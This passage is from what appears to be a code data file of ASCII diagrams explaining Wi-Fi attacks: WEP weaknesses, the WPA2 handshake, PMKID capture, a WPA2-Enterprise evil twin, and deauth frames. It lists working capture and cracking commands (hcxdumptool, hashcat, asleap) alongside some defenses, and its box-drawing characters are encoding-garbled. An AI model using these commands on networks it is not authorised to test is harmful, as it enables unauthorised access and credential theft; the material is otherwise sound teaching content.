â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚   RC4(IV + WEP Key, Data + ICV)                                   â”‚      â”‚
â”‚  â”‚   â”œâ”€â”€ Data (variable)                                             â”‚      â”‚
â”‚  â”‚   â””â”€â”€ ICV (4 bytes) - CRC-32 integrity check                     â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚                                                                               â”‚
â”‚  THE FATAL FLAW:                                                              â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                             â”‚
â”‚  â€¢ IV is only 24 bits = 16,777,216 possible values                           â”‚
â”‚  â€¢ Busy network exhausts IVs in hours â†’ guaranteed key recovery              â”‚
â”‚  â€¢ IV sent in PLAINTEXT â†’ attacker knows part of RC4 keystream seed          â”‚
â”‚  â€¢ Weak IVs (certain patterns) leak key bytes directly                       â”‚
â”‚  â€¢ No replay protection: capture and resend frames at will                   â”‚
â”‚                                                                               â”‚
â”‚  ATTACK MATH:                                                                 â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•                                                                 â”‚
â”‚  FMS Attack: ~4,000,000 IVs needed (~1 hour on active network)               â”‚
â”‚  PTW Attack: ~40,000 IVs needed (~5 minutes)                                 â”‚
â”‚  ChopChop:   Single packet â†’ decrypt any captured frame                      â”‚
â”‚                                                                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
  wpaHandshake: {
    title: "WPA/WPA2 4-Way Handshake Detailed",
    description: "The exchange attackers capture for offline cracking",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     WPA2-PSK 4-WAY HANDSHAKE DEEP DIVE                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                               â”‚
â”‚  PRE-REQUISITES (Both parties compute independently):                         â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                           â”‚
â”‚  PSK = Password (what user enters)                                            â”‚
â”‚  PMK = PBKDF2(HMAC-SHA1, PSK, SSID, 4096, 256)  â† Derived from password      â”‚
â”‚                                                                               â”‚
â”‚  THE 4-WAY HANDSHAKE:                                                         â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                       â”‚
â”‚                                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚
â”‚  â”‚  ğŸ“± CLIENT      â”‚                              â”‚  ğŸ“¡ AP          â”‚        â”‚
â”‚  â”‚  (Supplicant)   â”‚                              â”‚  (Authenticator)â”‚        â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚   â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAPOL Message 1 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚                â”‚
â”‚           â”‚   â”‚ ANonce (AP's random number)                â”‚                â”‚
â”‚           â”‚   â”‚ â˜… PMKID in RSN IE (extractable!)           â”‚                â”‚
â”‚           â”‚   â”‚ Replay counter                              â”‚                â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚   Client calculates:                            â”‚                â”‚
â”‚           â”‚   SNonce = random()                             â”‚                â”‚
â”‚           â”‚   PTK = PRF(PMK, ANonce, SNonce, MAC_AP,       â”‚                â”‚
â”‚           â”‚              MAC_Client)                        â”‚                â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAPOL Message 2 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚                â”‚
â”‚           â”‚   â”‚ SNonce (Client's random number)            â”‚                â”‚
â”‚           â”‚   â”‚ MIC = HMAC(KCK, Message)                   â”‚                â”‚
â”‚           â”‚   â”‚ RSN IE (security capabilities)              â”‚                â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚                    AP calculates same PTK       â”‚                â”‚
â”‚           â”‚                    AP verifies MIC âœ“            â”‚                â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚   â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAPOL Message 3 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚                â”‚
â”‚           â”‚   â”‚ ANonce (same as Msg 1)                     â”‚                â”‚
â”‚           â”‚   â”‚ GTK (encrypted with PTK)                   â”‚                â”‚
â”‚           â”‚   â”‚ MIC                                         â”‚                â”‚
â”‚           â”‚   â”‚ Install PTK flag                            â”‚                â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚   Client verifies MIC                           â”‚                â”‚
â”‚           â”‚   Client installs PTK and GTK                   â”‚                â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAPOL Message 4 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚                â”‚
â”‚           â”‚   â”‚ ACK (confirms key installation)            â”‚                â”‚
â”‚           â”‚   â”‚ MIC                                         â”‚                â”‚
â”‚           â”‚                                                 â”‚                â”‚
â”‚           â”‚   â•â•â•â•â•â•â•â•â•â• ENCRYPTED DATA FLOW â•â•â•â•â•â•â•â•â•â•â•â•   â”‚                â”‚
â”‚                                                                               â”‚
â”‚  PTK DERIVATION:                                                              â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                              â”‚
â”‚  PTK (512 bits) = PRF-512(PMK, "Pairwise key expansion",                     â”‚
â”‚                          Min(AA,SPA) || Max(AA,SPA) ||                        â”‚
â”‚                          Min(ANonce,SNonce) || Max(ANonce,SNonce))            â”‚
â”‚                                                                               â”‚
â”‚  PTK Components:                                                              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚  KCK (128b)   â”‚  KEK (128b)    â”‚  TK (128b)     â”‚  MIC Key (64b) â”‚      â”‚
â”‚  â”‚  Key Confirm  â”‚  Key Encrypt   â”‚  Temporal Key  â”‚  For Michael   â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚                                                                               â”‚
â”‚  WHY OFFLINE CRACKING WORKS:                                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                 â”‚
â”‚  Attacker captures: ANonce, SNonce, MAC addresses, MIC from Msg 2            â”‚
â”‚  For each password guess:                                                     â”‚
â”‚    1. Compute PMK = PBKDF2(guess, SSID)                                      â”‚
â”‚    2. Compute PTK from PMK + captured nonces + MACs                          â”‚
â”‚    3. Compute MIC with this PTK                                               â”‚
â”‚    4. Compare computed MIC with captured MIC                                  â”‚
â”‚    5. If match â†’ password found!                                              â”‚
â”‚                                                                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
  pmkidAttack: {
    title: "PMKID Attack Flow (Clientless)",
    description: "Attack WPA2 networks without any connected clients",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     PMKID ATTACK - NO CLIENT NEEDED!                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                               â”‚
â”‚  WHY THIS MATTERS:                                                            â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                            â”‚
â”‚  Traditional WPA attack: Need client connected OR wait for client            â”‚
â”‚  PMKID attack: Only need the AP itself! One association attempt is enough.   â”‚
â”‚                                                                               â”‚
â”‚  THE ATTACK:                                                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•                                                                  â”‚
â”‚                                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ ğŸ”“ ATTACKER â”‚                              â”‚  ğŸ“¡ TARGET AP   â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚         â”‚                                              â”‚                      â”‚
â”‚         â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€ Association Request â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                      â”‚
â”‚         â”‚                                              â”‚                      â”‚
â”‚         â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€ Association Response â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                      â”‚
â”‚         â”‚                                              â”‚                      â”‚
â”‚         â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€ EAPOL Message 1 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                      â”‚
â”‚         â”‚          â”‚                                   â”‚                      â”‚
â”‚         â”‚          â”‚ ANonce                            â”‚                      â”‚
â”‚         â”‚          â”‚ RSN IE containing PMKID â˜…         â”‚                      â”‚
â”‚         â”‚          â”‚                                   â”‚                      â”‚
â”‚         â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚                      â”‚
â”‚         â”‚                                              â”‚                      â”‚
â”‚         â”‚ DONE! Disconnect and crack offline           â”‚                      â”‚
â”‚                                                                               â”‚
â”‚  PMKID CALCULATION:                                                           â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                           â”‚
â”‚  PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_Client)              â”‚
â”‚                                                                               â”‚
â”‚  WHY IT'S CRACKABLE:                                                          â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                          â”‚
â”‚  â€¢ PMK derived from password: PMK = PBKDF2(Password, SSID)                   â”‚
â”‚  â€¢ All other values known: "PMK Name" is literal string, MACs are captured   â”‚
â”‚  â€¢ For each password guess â†’ compute PMK â†’ compute PMKID â†’ compare           â”‚
â”‚                                                                               â”‚
â”‚  ATTACK COMMANDS:                                                             â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                             â”‚
â”‚                                                                               â”‚
â”‚  # Capture PMKID with hcxdumptool                                            â”‚
â”‚  hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1                 â”‚
â”‚                                                                               â”‚
â”‚  # Convert capture to hashcat format                                          â”‚
â”‚  hcxpcapngtool -o hash.22000 capture.pcapng                                  â”‚
â”‚                                                                               â”‚
â”‚  # Crack with hashcat (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)                  â”‚
â”‚  hashcat -m 22000 hash.22000 wordlist.txt                                    â”‚
â”‚                                                                               â”‚
â”‚  PERFORMANCE (RTX 4090):                                                      â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                       â”‚
â”‚  ~2,500,000 passwords/second                                                  â”‚
â”‚  8-char lowercase = 200 billion combos = ~24 hours                           â”‚
â”‚  Dictionary of 100M passwords = ~40 seconds                                   â”‚
â”‚                                                                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
  enterpriseAttack: {
    title: "WPA2-Enterprise Evil Twin Attack",
    description: "Credential theft via rogue RADIUS server",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                WPA2-ENTERPRISE EVIL TWIN ATTACK FLOW                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                               â”‚
â”‚  SETUP PHASE:                                                                 â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•                                                                 â”‚
â”‚                                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚  â”‚                    ATTACKER'S EVIL TWIN SETUP                       â”‚     â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”‚
â”‚  â”‚                                                                     â”‚     â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚     â”‚
â”‚  â”‚  â”‚ hostapd-wpe â”‚â”€â”€â”€â–ºâ”‚ Fake RADIUS â”‚â”€â”€â”€â–ºâ”‚  Credential â”‚            â”‚     â”‚
â”‚  â”‚  â”‚ (Evil Twin) â”‚    â”‚   Server    â”‚    â”‚    Store    â”‚            â”‚     â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚     â”‚
â”‚  â”‚         â”‚                                                          â”‚     â”‚
â”‚  â”‚         â”‚ Broadcasts: "CorporateWiFi" (same SSID as target)       â”‚     â”‚
â”‚  â”‚         â”‚ Higher power = clients prefer our signal                 â”‚     â”‚
â”‚  â”‚                                                                     â”‚     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                               â”‚
â”‚  ATTACK EXECUTION:                                                            â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                            â”‚
â”‚                                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
â”‚  â”‚ ğŸ‘¤ VICTIM   â”‚         â”‚ ğŸ”“ EVIL TWIN â”‚         â”‚ ğŸ“¡ LEGIT AP â”‚            â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜            â”‚
â”‚         â”‚                       â”‚                       â”‚                    â”‚
â”‚         â”‚â—„â”€â”€â”€ Deauth from real AP (optional) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                    â”‚
â”‚         â”‚                       â”‚                       â”‚                    â”‚
â”‚         â”‚                       â”‚â—„â”€â”€ Stronger signal    â”‚                    â”‚
â”‚         â”‚                       â”‚                       â”‚                    â”‚
â”‚         â”‚â”€â”€â”€â”€ Connect to "CorporateWiFi" â”€â”€â”€â”€â”€â”€â–ºâ”‚       â”‚                    â”‚
â”‚         â”‚                       â”‚                       â”‚                    â”‚
â”‚         â”‚â”€â”€â”€â”€ EAP Identity: "jsmith@corp.com" â”€â–ºâ”‚       â”‚                    â”‚
â”‚         â”‚                       â”‚                       â”‚                    â”‚
â”‚         â”‚â—„â”€â”€â”€ EAP Challenge â”€â”€â”€â”€â”‚                       â”‚                    â”‚
â”‚         â”‚                       â”‚                       â”‚                    â”‚
â”‚         â”‚â”€â”€â”€â”€ MSCHAPv2 Response (hash) â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚       â”‚                    â”‚
â”‚         â”‚     CAPTURED! â˜…                       â”‚       â”‚                    â”‚
â”‚         â”‚                       â”‚                       â”‚                    â”‚
â”‚         â”‚â—„â”€â”€â”€ Fake failure/success â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚       â”‚                    â”‚
â”‚                                                                               â”‚
â”‚  WHAT'S CAPTURED:                                                             â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                             â”‚
â”‚  â€¢ Username (EAP Identity)                                                    â”‚
â”‚  â€¢ MSCHAPv2 Challenge                                                         â”‚
â”‚  â€¢ MSCHAPv2 Response (NT hash-based)                                         â”‚
â”‚                                                                               â”‚
â”‚  CRACKING THE CREDENTIALS:                                                    â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                    â”‚
â”‚  # Using asleap                                                               â”‚
â”‚  asleap -C <challenge> -R <response> -W wordlist.txt                         â”‚
â”‚                                                                               â”‚
â”‚  # Using hashcat (mode 5500 = NetNTLMv1)                                     â”‚
â”‚  hashcat -m 5500 captured_hash.txt wordlist.txt                              â”‚
â”‚                                                                               â”‚
â”‚  WHY IT WORKS:                                                                â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•                                                                â”‚
â”‚  â€¢ Many devices don't validate server certificates properly                   â”‚
â”‚  â€¢ Users click "Trust" when prompted about unknown certificate               â”‚
â”‚  â€¢ Mobile devices especially bad at cert validation                          â”‚
â”‚  â€¢ PEAP/MSCHAPv2 sends crackable hash over the wire                         â”‚
â”‚                                                                               â”‚
â”‚  DEFENSE:                                                                     â”‚
â”‚  â•â•â•â•â•â•â•â•                                                                     â”‚
â”‚  â€¢ Use EAP-TLS with client certificates (mutual auth)                        â”‚
â”‚  â€¢ Configure clients to validate server certificate                          â”‚
â”‚  â€¢ Pin the RADIUS server certificate in device profiles                      â”‚
â”‚  â€¢ Use 802.11w (PMF) to prevent deauth attacks                              â”‚
â”‚                                                                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
  deauthFrame: {
    title: "Deauthentication Frame Anatomy",
    description: "Why deauth attacks work and how they're used",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  802.11 DEAUTHENTICATION FRAME STRUCTURE                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                               â”‚
â”‚  FRAME FORMAT:                                                                â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•                                                                â”‚
â”‚                                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚Frame Controlâ”‚ Duration â”‚  Addr 1  â”‚  Addr 2  â”‚  Addr 3  â”‚  Seq Ctl  â”‚    â”‚
â”‚  â”‚   2 bytes   â”‚  2 bytes â”‚  6 bytes â”‚  6 bytes â”‚  6 bytes â”‚  2 bytes  â”‚    â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”‚
â”‚  â”‚                                                                      â”‚    â”‚
â”‚  â”‚  Frame Control: 0x00C0 (Deauthentication)                           â”‚    â”‚
â”‚  â”‚  â”‚                                                                   â”‚    â”‚
â”‚  â”‚  â”‚  Type: 00 (Management)                                           â”‚    â”‚
â”‚  â”‚  â”‚  Subtype: 1100 (Deauthentication)                               â”‚    â”‚
â”‚  â”‚  â”‚                                                                   â”‚    â”‚
â”‚  â”‚  Addr 1: Destination (client or broadcast FF:FF:FF:FF:FF:FF)        â”‚    â”‚
â”‚  â”‚  Addr 2: Source (AP BSSID)                                           â”‚    â”‚
â”‚  â”‚  Addr 3: BSSID                                                       â”‚    â”‚
â”‚  â”‚                                                                      â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚                        FRAME BODY (2 bytes)                          â”‚    â”‚
